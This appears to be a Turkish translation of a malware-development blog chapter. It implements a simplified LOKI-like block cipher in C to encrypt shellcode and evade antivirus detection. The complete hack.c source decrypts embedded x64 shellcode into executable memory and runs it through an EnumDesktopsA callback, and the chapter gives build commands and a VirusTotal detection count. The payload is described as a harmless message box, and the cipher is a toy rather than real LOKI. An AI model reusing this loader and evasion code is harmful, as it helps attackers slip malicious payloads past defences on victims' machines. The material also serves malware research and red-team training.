\newpage
\subsection{92. Kötü amaçlı yazılım ve kriptografi araştırması - bölüm 1 (29): LOKI payload şifreleme. Basit C örneği.}

﷽

![kriptografi](./images/129/2024-07-17_19-26.png){width="80%"}     

Bu gönderi, şifreleme mantığını farklı bir yöntemle uygulayarak AV motorlarından kaçınma araştırmamın bir sonucudur: LOKI simetrik anahtar blok şifreleyici. Her zamanki gibi çeşitli kripto algoritmalarını keşfederken, bunu yükü şifrelemek/çözmek için uygularsak ne olacağını kontrol etmeye karar verdim.    

### LOKI

Avustralyalı kriptograflar Lawrie Brown, Josef Pieprzyk ve Jennifer Seberry, *LOKI (LOKI89)*'u ilk olarak `1990` yılında *"LOKI"* adıyla yayınladı. LOKI89, Avrupa RIPE projesine inceleme için sunuldu, ancak seçilmedi. LOKI, DES'e alternatif bir aday olarak sunulmuştu.     

### pratik örnek

Hadi bunu uygulayalım. LOKI algoritması `64-bitlik` bir blok ve `64-bitlik` bir anahtar kullanır. LOKI blok şifreleme fonksiyonu, bir Feistel yapısı üzerinden birden çok tur boyunca şifreleme yapar. Aşağıda bu fonksiyonun nasıl çalıştığının ayrıntılı adım adım açıklaması bulunmaktadır:    

```cpp
void loki_encrypt(u8 *block, u8 *key) {
  // LOKI encryption (simplified for demo)
  u32 left = ((u32)block[0] << 24) | 
  ((u32)block[1] << 16) | ((u32)block[2] << 8) | 
  (u32)block[3];
  u32 right = ((u32)block[4] << 24) | ((u32)block[5] << 16) | 
  ((u32)block[6] << 8) | (u32)block[7];

  for (int round = 0; round < ROUNDS; round++) {
    u32 temp = right;
    right = left ^ (right + ((u32)key[round % KEY_SIZE]));
    left = temp;
  }

  block[0] = (left >> 24) & 0xFF;
  block[1] = (left >> 16) & 0xFF;
  block[2] = (left >> 8) & 0xFF;
  block[3] = left & 0xFF;
  block[4] = (right >> 24) & 0xFF;
  block[5] = (right >> 16) & 0xFF;
  block[6] = (right >> 8) & 0xFF;
  block[7] = right & 0xFF;
}
```

`64-bit`lik blok iki `32-bit`lik yarıya bölünür: sol ve sağ:   

```cpp
u32 left = ((u32)block[0] << 24) | ((u32)block[1] << 16) | 
((u32)block[2] << 8) | (u32)block[3];
u32 right = ((u32)block[4] << 24) | ((u32)block[5] << 16) | 
((u32)block[6] << 8) | (u32)block[7];
```

Sol yarı (`left`), bloğun ilk dört baytının birleştirilmesiyle oluşturulur.
Sağ yarı (`right`), bloğun son dört baytının birleştirilmesiyle oluşturulur.

Şifreleme işlemi birden çok tur içerir (benim uygulamamda `16` tur):     

```cpp
for (int round = 0; round < ROUNDS; round++) {
  u32 temp = right;
  right = left ^ (right + ((u32)key[round % KEY_SIZE]));
  left = temp;
}
```

Her tur için:

- `temp`, mevcut `right` değerini saklar.    
- `right`, `left` ve `right` ile bir anahtar değerin toplamının `XOR` işlemi  uygulanmasıyla güncellenir. Anahtar değeri, key[round % KEY_SIZE] kullanılarak döngüsel olarak seçilir.    
- `left`, `temp` değişkeninde saklanan önceki `right` değerine güncellenir.   

Son olarak, şifrelenmiş bloğun mantığını yeniden oluşturma:    

```cpp
block[0] = (left >> 24) & 0xFF;
block[1] = (left >> 16) & 0xFF;
block[2] = (left >> 8) & 0xFF;
block[3] = left & 0xFF;
block[4] = (right >> 24) & 0xFF;
block[5] = (right >> 16) & 0xFF;
block[6] = (right >> 8) & 0xFF;
block[7] = right & 0xFF;
```

Tüm turlar tamamlandıktan sonra, sol ve sağ yarılar orijinal bloğa geri birleştirilir.
`32-bit`lik `left` ve `right` değerleri baytlara bölünerek tekrar blok dizisine kaydedilir.    

Benim örneğimde, bu fonksiyon LOKI şifreleme sürecinin temel işlemlerine odaklanarak verilerin bölünmesi, işlenmesi ve yeniden birleştirilmesini içeren basitleştirilmiş bir görünüm sunmaktadır.    

Ardından, şifre çözme mantığını yeniden uygulama:   

```cpp
void loki_decrypt(u8 *block, u8 *key) {
  // LOKI decryption (simplified for demo)
  u32 left = ((u32)block[0] << 24) | ((u32)block[1] << 16) | 
  ((u32)block[2] << 8) | (u32)block[3];
  u32 right = ((u32)block[4] << 24) | ((u32)block[5] << 16) | 
  ((u32)block[6] << 8) | (u32)block[7];

  for (int round = ROUNDS - 1; round >= 0; round--) {
    u32 temp = left;
    left = right ^ (left + ((u32)key[round % KEY_SIZE]));
    right = temp;
  }

  block[0] = (left >> 24) & 0xFF;
  block[1] = (left >> 16) & 0xFF;
  block[2] = (left >> 8) & 0xFF;
  block[3] = left & 0xFF;
  block[4] = (right >> 24) & 0xFF;
  block[5] = (right >> 16) & 0xFF;
  block[6] = (right >> 8) & 0xFF;
  block[7] = right & 0xFF;
}
```

Daha sonra, LOKI blok şifreleme kullanarak belirli bir shellcode'u şifrelemek için `loki_encrypt_shellcode` fonksiyonuna ihtiyacımız var:   

```cpp
void loki_encrypt_shellcode(unsigned char* shellcode, int shellcode_len) {
  int i;
  for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
    loki_encrypt(shellcode + i * BLOCK_SIZE, key);
  }
  // check if there are remaining bytes
  int remaining = shellcode_len % BLOCK_SIZE;
  if (remaining != 0) {
    unsigned char pad[BLOCK_SIZE] = 
    {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
    memcpy(pad, shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, 
    remaining);
    loki_encrypt(pad, key);
    memcpy(shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, pad, 
    remaining);
  }
}
```

Nasıl çalışır?    

Shellcode'u `8-bayt`lık bloklar halinde döngüye sok:    

```cpp
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
  loki_encrypt(shellcode + i * BLOCK_SIZE, key);
}
```

Her `8-bayt`lık blok için, mevcut blok ve şifreleme anahtarı ile `loki_encrypt` fonksiyonu çağrılır. `shellcode + i * BLOCK_SIZE`, shellcode içindeki mevcut `8-bayt`lık bloğun adresini hesaplar.    

Tüm tam `8-bayt`lık bloklar işlendiğinde, fonksiyon eksik kalan ve tam bir blok oluşturmayan bayt olup olmadığını kontrol eder.     

```cpp
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
  unsigned char pad[BLOCK_SIZE] = 
  {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
  memcpy(pad, shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, 
  remaining);
  loki_encrypt(pad, key);
  memcpy(shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, pad, 
  remaining);
}
```

Not: Her zamanki gibi, bir doldurma dizisi (padding array) pad, `8 bayt` uzunluğunda ve `0x90` (`x86` assembly'de `NOP` talimatı) ile başlatılmıştır.    

Bu fonksiyon, LOKI algoritmasını kullanarak tüm shellcode'un, uzunluğu ne olursa olsun, düzgün şekilde şifrelenmesini sağlar ve eksik blokları uygun şekilde işler.         

Ardından, şifre çözme mantığını oluştur:    

```cpp
void loki_decrypt_shellcode(unsigned char* shellcode, int shellcode_len) {
  int i;
  for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
    loki_decrypt(shellcode + i * BLOCK_SIZE, key);
  }
  // check if there are remaining bytes
  int remaining = shellcode_len % BLOCK_SIZE;
  if (remaining != 0) {
    unsigned char pad[BLOCK_SIZE] = 
    {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
    memcpy(pad, shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, 
    remaining);
    loki_decrypt(pad, key);
    memcpy(shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, pad, 
    remaining);
  }
}
```

Son payload'u çalıştırmak için tam kaynak kodu (`hack.c`) şu şekildedir:    

```cpp
/*
* hack.c
* encrypt/decrypt payload via LOKI
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2024/07/16/malware-cryptography-29.html
*/
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#define ROUNDS 16
#define BLOCK_SIZE 8
#define KEY_SIZE 8

typedef uint32_t u32;
typedef uint8_t u8;

u8 key[KEY_SIZE] = {0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF};

void loki_encrypt(u8 *block, u8 *key) {
  // LOKI encryption (simplified for demo)
  u32 left = ((u32)block[0] << 24) | ((u32)block[1] << 16) | 
  ((u32)block[2] << 8) | (u32)block[3];
  u32 right = ((u32)block[4] << 24) | ((u32)block[5] << 16) | 
  ((u32)block[6] << 8) | (u32)block[7];

  for (int round = 0; round < ROUNDS; round++) {
    u32 temp = right;
    right = left ^ (right + ((u32)key[round % KEY_SIZE]));
    left = temp;
  }

  block[0] = (left >> 24) & 0xFF;
  block[1] = (left >> 16) & 0xFF;
  block[2] = (left >> 8) & 0xFF;
  block[3] = left & 0xFF;
  block[4] = (right >> 24) & 0xFF;
  block[5] = (right >> 16) & 0xFF;
  block[6] = (right >> 8) & 0xFF;
  block[7] = right & 0xFF;
}

void loki_decrypt(u8 *block, u8 *key) {
  // LOKI decryption (simplified for demo)
  u32 left = ((u32)block[0] << 24) | ((u32)block[1] << 16) | 
  ((u32)block[2] << 8) | (u32)block[3];
  u32 right = ((u32)block[4] << 24) | ((u32)block[5] << 16) | 
  ((u32)block[6] << 8) | (u32)block[7];

  for (int round = ROUNDS - 1; round >= 0; round--) {
    u32 temp = left;
    left = right ^ (left + ((u32)key[round % KEY_SIZE]));
    right = temp;
  }

  block[0] = (left >> 24) & 0xFF;
  block[1] = (left >> 16) & 0xFF;
  block[2] = (left >> 8) & 0xFF;
  block[3] = left & 0xFF;
  block[4] = (right >> 24) & 0xFF;
  block[5] = (right >> 16) & 0xFF;
  block[6] = (right >> 8) & 0xFF;
  block[7] = right & 0xFF;
}

void loki_encrypt_shellcode(unsigned char* shellcode, int shellcode_len) {
  int i;
  for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
    loki_encrypt(shellcode + i * BLOCK_SIZE, key);
  }
  // check if there are remaining bytes
  int remaining = shellcode_len % BLOCK_SIZE;
  if (remaining != 0) {
    unsigned char pad[BLOCK_SIZE] = 
    {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
    memcpy(pad, shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, 
    remaining);
    loki_encrypt(pad, key);
    memcpy(shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, pad, 
    remaining);
  }
}

void loki_decrypt_shellcode(unsigned char* shellcode, int shellcode_len) {
  int i;
  for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
    loki_decrypt(shellcode + i * BLOCK_SIZE, key);
  }
  // check if there are remaining bytes
  int remaining = shellcode_len % BLOCK_SIZE;
  if (remaining != 0) {
    unsigned char pad[BLOCK_SIZE] = 
    {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
    memcpy(pad, shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, 
    remaining);
    loki_decrypt(pad, key);
    memcpy(shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, pad, 
    remaining);
  }
}

int main() {
  unsigned char my_payload[] = 
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";

  int my_payload_len = sizeof(my_payload);
  int pad_len = my_payload_len + (8 - my_payload_len % 8) % 8;
  unsigned char padded[pad_len];
  memset(padded, 0x90, pad_len);
  memcpy(padded, my_payload, my_payload_len);

  printf("original shellcode: ");
  for (int i = 0; i < my_payload_len; i++) {
    printf("%02x ", my_payload[i]);
  }
  printf("\n\n");

  loki_encrypt_shellcode(padded, pad_len);

  printf("encrypted shellcode: ");
  for (int i = 0; i < pad_len; i++) {
    printf("%02x ", padded[i]);
  }
  printf("\n\n");

  loki_decrypt_shellcode(padded, pad_len);

  printf("decrypted shellcode: ");
  for (int i = 0; i < my_payload_len; i++) {
    printf("%02x ", padded[i]);
  }

  printf("\n\n");

  LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT, 
  PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, padded, my_payload_len);
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
  return 0;
}
```

Gördüğünüz gibi, payload’u çalıştırmak için [EnumDesktopsA](https://cocomelonc.github.io/malware/2024/06/12/malware-trick-39.html) tekniğini kullandım.    

Ayrıca her zamanki gibi, basit olması için `meow-meow` messagebox payload’unu kullandım:     

```cpp
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";
```

Doğruluğu kontrol etmek için karşılaştırma ve yazdırma mantığını ekledim.   

### demo

Hadi her şeyi aksiyonda görelim. Derleyelim (benim `kali` makinemde):    

```bash
x86_64-w64-mingw32-gcc -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc
```

![kriptografi](./images/129/2024-07-17_19-21.png){width="80%"}      

Daha sonra, bunu kurbanın makinesinde (`windows 11 x64` benim durumumda) çalıştırın:    

```powershell
.\hack.exe
```

![kriptografi](./images/129/2024-07-17_19-25.png){width="80%"}      

Gördüğünüz gibi, her şey mükemmel çalıştı! =^..^=     

Shannon entropisini hesaplayın:    

```bash
python3 entropy.py -f hack.exe
```

![kriptografi](./images/129/2024-07-17_21-06.png){width="80%"}      

Payload'ımız `.text` bölümünde.    

Hadi bu `hack.exe` dosyasını VirusTotal'a yükleyelim:     

![kriptografi](./images/129/2024-07-17_21-10.png){width="80%"}      

[https://www.virustotal.com/gui/file/04bede4d03cd8f610fa90c4d41e1439e3adcd66069a378b9db4f94e62a7572cd/detection](https://www.virustotal.com/gui/file/04bede4d03cd8f610fa90c4d41e1439e3adcd66069a378b9db4f94e62a7572cd/detection)    

**Gördüğünüz gibi, 73 antivirüs motorundan sadece 27 tanesi dosyamızı zararlı olarak tespit etti.**     

Ancak bu sonuç, payload'un şifrelenmesinden değil, `VirtualAlloc`, `RtlMoveMemory` ve `EnumDesktopsA` gibi bazı Windows API çağrılarından kaynaklanıyor.      

Biham ve Shamir, diferansiyel kriptanalizi başarıyla uygulayarak LOKI'yi `11` veya daha az tur ile verimli bir şekilde şifre çözme işlemi gerçekleştirdi ve bu, brute force yöntemlerinden daha hızlıydı.      

Umarım bu gönderi, kötü amaçlı yazılım araştırmacıları, C/C++ programcıları için faydalı olur, bu ilginç şifreleme tekniği hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takımın cephaneliğine bir silah ekler.      

[LOKI](https://en.wikipedia.org/wiki/LOKI)     
[Kötü Amaçlı Yazılım ve Kriptografi 1](https://cocomelonc.github.io/malware/2023/08/13/malware-cryptography-1.html)      
[GitHub'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2024-07-16-malware-cryptography-29)    